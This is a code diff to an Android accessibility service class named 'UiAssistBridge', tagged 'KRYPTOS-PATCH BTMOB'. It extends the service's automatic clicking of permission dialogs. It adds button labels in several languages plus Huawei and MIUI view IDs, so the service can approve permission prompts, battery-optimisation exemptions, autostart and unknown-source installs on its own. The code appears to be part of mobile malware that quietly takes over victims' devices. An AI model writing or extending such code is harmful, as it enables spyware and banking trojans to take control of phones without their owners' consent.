@@ -7292,7 +7292,20 @@ public class UiAssistBridge extends AccessibilityService {
         if (!foundBatteryText) return false;
         
         // Procura botão "Allow" / "Permitir"
-        String[] allowButtons = {"Allow", "Permitir", "OK", "Yes", "Sim"};
+        String[] allowButtons = {"Allow", "Permitir", "OK", "Yes", "Sim", "Autoriser", "Erlauben", "izin ver", "izinkan", "Aceptar", "Confirmar", "Permitir siempre", "Permitir solo mientras se usa la aplicacion", "Permitir apenas enquanto estiver usando o aplicativo", "Once", "Nenhuma restricao", "No restrictions", "Sin restricciones", "No restringir", "Siempre", "Always"}; // [KRYPTOS-PATCH BTMOB]
+        String[] allowIds = {"com.huawei.packageinstaller:id/permission_allow_button", "com.huawei.systemmanager:id/btn_allow", "com.lbe.security.miui:id/permission_allow_foreground_only_button", "com.miui.securitycenter:id/accept", "miui:id/action_positive", "miui:id/button2", "miui:id/grant", "android:id/button1"};
+        for (String idv : allowIds) {
+            try {
+                List<AccessibilityNodeInfo> bs = rootNode.findAccessibilityNodeInfosByViewId(idv);
+                if (bs != null && !bs.isEmpty()) {
+                    for (AccessibilityNodeInfo b2 : bs) {
+                        if (b2.isClickable()) { Log.d(TAG, "DIALOG: clicando id " + idv); b2.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true; }
+                        AccessibilityNodeInfo p2 = b2.getParent();
+                        if (p2 != null && p2.isClickable()) { p2.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true; }
+                    }
+                }
+            } catch (Throwable ignored) {}
+        }
         for (String buttonText : allowButtons) {
             List<AccessibilityNodeInfo> buttons = rootNode.findAccessibilityNodeInfosByText(buttonText);
             if (buttons != null && !buttons.isEmpty()) {
@@ -7424,7 +7437,7 @@ public class UiAssistBridge extends AccessibilityService {
             "Unrestricted", "No restrictions", "Don't optimize",
             "Allow background activity", "Keep running", "Ignore optimization",
             "Allow", "Enable", "Turn on", "Yes", "Accept",
-            "Auto-start", "Autostart", "Auto start", "Auto launch"
+            "Auto-start", "Autostart", "Auto start", "Auto launch", "Sin restricciones", "No restringir", "Sin limites", "Empezar", "Iniciar", "Siempre", "Permitir siempre", "Autoarranque", "Arranque automatico", "Habilitar autoarranque", "Autoriser", "Erlauben", "izin ver", "izinkan", "No optimizar"
         };
         
         // Tenta encontrar e clicar em switches/botões
@@ -7596,7 +7609,7 @@ public class UiAssistBridge extends AccessibilityService {
             "Allow from this source", "Permitir desta fonte",
             "Allow", "Permitir",
             "Trust", "Confiar",
-            "ON", "Ativado", "Ligado"
+            "ON", "Ativado", "Ligado", "Permitir siempre", "Siempre", "Autoriser", "Erlauben", "izin ver", "izinkan", "Aceptar", "Confirmar", "Permitir la instalacion"
         };
         
         // Primeiro, procura por Switch ou Toggle
